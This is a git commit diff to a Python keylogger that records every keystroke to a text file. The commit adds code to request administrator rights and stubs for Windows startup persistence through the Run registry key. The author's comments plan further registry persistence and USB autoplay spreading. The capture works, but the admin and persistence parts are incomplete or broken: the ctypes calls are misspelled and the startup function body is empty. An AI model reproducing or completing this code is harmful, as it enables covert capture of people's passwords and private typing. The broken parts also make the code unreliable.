64d6d859e91f16a653fdef2bcc66fcf44f3ef949
a-b-h-a-y-s-h-i-n-d-e <theabhay.shinde@gmail.com>
2024-02-14 00:49:22 +0530

    cheking for run as admin!

--- main.py
+++ main.py
@@ -1,19 +1,50 @@
 
-import time
 from pynput import keyboard
 from pynput.keyboard import Listener
 from datetime import datetime
-
+import winreg 
+import threading
+import time
+import ctypes
+import os
+import sys
 
 class Keylogger:
 
     def __init__(self):
         self.log = "Keylogger started ..."
 
+    # this are primary methods which should be done
+
+    def isAdmin(self):
+        try:
+            return ctypes.wind11.shell32.IsUserAnAdmin()
+        except:
+            return False
+
+    def runAsAdmin(self):
+        if not self.isAdmin():
+            ctypes.wind11.shell32.ShellExecuteW(None, "runas", 
+                                                sys.executable, " ".join(sys.argv), None, 1)
+
+    def addToStartup(self):
+        scriptPath = os.path.abspath(sys.argv[0])
+        key = r"Software\Microsoft\Windows\CurrentVersion\Run"
+
+        try:
+            pass
+        
+        except:
+            pass
+
     
+
+    # This are easy methods to understand
+
     def saveLogToFile(self, log):
         with open("keylog.txt", "a") as file:
             file.write(log)
+            file.close()
 
     def saveData(self, key):
         try:
@@ -26,15 +57,13 @@ class Keylogger:
             else:
                 currentKey = " " + str(key) + " "
 
-        currentTime = datetime.now().strftime(" %Y-%m-%d %H:%M:%S ")
-        log = currentKey + currentTime + "\n"
+        currentTime = datetime.now().strftime("%Y-%m-%d %H:%M:%S ")
+        log = currentTime + " -> " + currentKey + "\n"
         self.saveLogToFile(log)
 
     def run(self):
 
-        keyboardListener = keyboard.Listener(on_press=self.saveData)
-
-        with keyboardListener:
+        with keyboard.Listener(on_press=self.saveData) as keyboardListener:
             keyboardListener.join()
 
 
@@ -75,18 +104,15 @@ if __name__ == "__main__":
 
 
 
+"""
+--> tasks which I should do now 
+    
+    - the script should move to registry of windows
 
-
+    - also for pendrive just research about autoplay and python code 
+      to on that also
 
 
 """
- points to be considered
 
- --> first take screenshot for every 10 seconds or like every mouse interaction
- --> then add that screenshot to a pdf
- --> along with key logs 
- --> first of all we will only run this script for about 10 minutes and
-        then terminate it !
 
---> the idea is bit changed now , we will only now adding logs to .txt __file
-"""
